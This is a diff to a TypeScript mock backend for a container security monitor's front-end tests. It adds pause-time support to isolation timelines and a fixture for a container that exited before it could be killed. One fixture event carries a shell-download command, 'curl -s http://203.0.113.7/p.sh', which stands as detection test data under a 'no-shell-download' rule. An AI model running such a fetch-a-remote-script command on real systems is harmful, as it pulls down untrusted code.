@@ -153,12 +153,17 @@ export function validateSequence(r: Rule): string[] {
   });
   return errs;
 }
-// 격리 타임라인(계약 §3) — 탐지 기준 ms 오프셋. 키를 null 로 주면 뺀다(없는 구간 「—」 재현)
+// 격리 타임라인(계약 §3) — 탐지 기준 ms 오프셋. 키를 null 로 주면 뺀다(없는 구간 「—」 재현).
+// pauseMs(11/16 정지 시각)는 기본에 없다 — 옛 기록 모양. 주면 pausedAt 이 붙는다
 export const TL = { matchMs: 12, evidenceStartMs: 15, evidenceDoneMs: 310, killMs: 420, notifyMs: 431 };
-export function timeline(detectedAt: number, o: Partial<{ matchMs: number; evidenceStartMs: number | null; evidenceDoneMs: number | null; killMs: number | null; notifyMs: number | null }> = {}): Timeline {
+export function timeline(
+  detectedAt: number,
+  o: Partial<{ matchMs: number; pauseMs: number | null; evidenceStartMs: number | null; evidenceDoneMs: number | null; killMs: number | null; notifyMs: number | null }> = {},
+): Timeline {
   const at = (ms: number) => new Date(detectedAt + ms).toISOString();
-  const v = { ...TL, ...o };
+  const v = { pauseMs: null as number | null, ...TL, ...o };
   const t: Timeline = { detectedAt: at(0), matchedAt: at(v.matchMs) };
+  if (v.pauseMs != null) t.pausedAt = at(v.pauseMs);
   if (v.evidenceStartMs != null) t.evidenceStartedAt = at(v.evidenceStartMs);
   if (v.evidenceDoneMs != null) t.evidenceDoneAt = at(v.evidenceDoneMs);
   if (v.killMs != null) t.killedAt = at(v.killMs);
@@ -250,6 +255,7 @@ export class MockBackend {
   demoDown = false;
   demoRefused = false;
   demoStepMs = 250; // 모의 재생 간격
+  demoPauseMs: number | null = null; // 11/16: 주면 시연 격리 타임라인에 정지 시각(탐지 기준 ms)
   // R3 11/04: GET /api/demo 의 Run.explain(backend demo/explain.go 모양) — false 면 옛 백엔드처럼 explain 없음. 테스트가 run.explain 을 직접 넣으면 그대로 둔다
   demoExplain = true;
   private demoTimers: number[] = [];
@@ -531,12 +537,13 @@ export class MockBackend {
     for (const c of this.collected) c.dns = 1 + (c.minute % 2);
     return this;
   }
-  // 10/30: 격리 타임라인 — ins-0012(설치) · case-0005(런타임)의 첫 kill 판정 + 그 감사 행. 설치 쪽은 알림 구간 없음(「—」 재현)
-  enableIsolation() {
+  // 10/30: 격리 타임라인 — ins-0012(설치) · case-0005(런타임)의 첫 kill 판정 + 그 감사 행. 설치 쪽은 알림 구간 없음(「—」 재현).
+  // pauseMs(11/16): 설치 쪽 타임라인에만 정지 시각을 붙인다(런타임 쪽은 옛 모양 그대로 — 둘이 함께 보이는지 본다)
+  enableIsolation(o: { pauseMs?: number } = {}) {
     const s = this.installs.find((x) => x.id === 'ins-0012');
     const first = s?.violations?.[0];
     if (s && first) {
-      const tl = timeline(Date.parse(first.event.timestamp), { notifyMs: null });
+      const tl = timeline(Date.parse(first.event.timestamp), { notifyMs: null, pauseMs: o.pauseMs ?? null });
       first.timeline = tl;
       const row = this.audit.find((a) => a.caseId === 'case-0004' && a.ruleId === first.ruleId);
       if (row) row.timeline = tl;
@@ -551,6 +558,18 @@ export class MockBackend {
     const r = this.recent.find((v) => v.event.containerName === 'pkg-reqeusts' && v.action === 'kill');
     if (r && row5?.timeline) r.timeline = row5.timeline;
     return this;
+  }
+  // 11/16: 이미 끝난 컨테이너의 격리 대상 기록 하나를 맨 위에 더한다 — pause 가 「not running」이라 격리 아님 + 사유,
+  // 타임라인은 증거 시각만(정지 · 격리 · 알림 없음, 백엔드 enforcer.KillTimed). 더한 감사 id 를 돌려준다
+  exitedBeforeKill(): number {
+    const ctr = 'sg-install-pip-1792043500-0016';
+    const v = kill(ev(this.now, 30, ctr, PYIMG, { kind: 'exec', comm: 'curl', args: 'curl -s http://203.0.113.7/p.sh' }), 'no-shell-download', '셸 다운로더');
+    v.enforced = false;
+    v.enforceError = 'container is not running';
+    v.timeline = timeline(Date.parse(v.event.timestamp), { killMs: null, notifyMs: null, evidenceStartMs: 14, evidenceDoneMs: 96 });
+    const id = Math.max(0, ...this.audit.map((a) => a.id)) + 1;
+    this.audit.unshift({ ...v, id, caseId: null, install: null });
+    return id;
   }
   // 10/30: 시연 켜기(/api/info.demo = true + /api/demo 경로)
   enableDemo() {
@@ -696,7 +715,7 @@ export class MockBackend {
       steps.push(() => {
         if (stopped) return;
         const v = mk();
-        if (v.enforced) v.timeline = timeline(Date.parse(v.event.timestamp));
+        if (v.enforced) v.timeline = timeline(Date.parse(v.event.timestamp), { pauseMs: this.demoPauseMs });
         const k = v.event.kind;
         session.activity!.kinds[k] = (session.activity!.kinds[k] ?? 0) + 1;
         const iv: InstallViolation = { ...v, count: 1 };
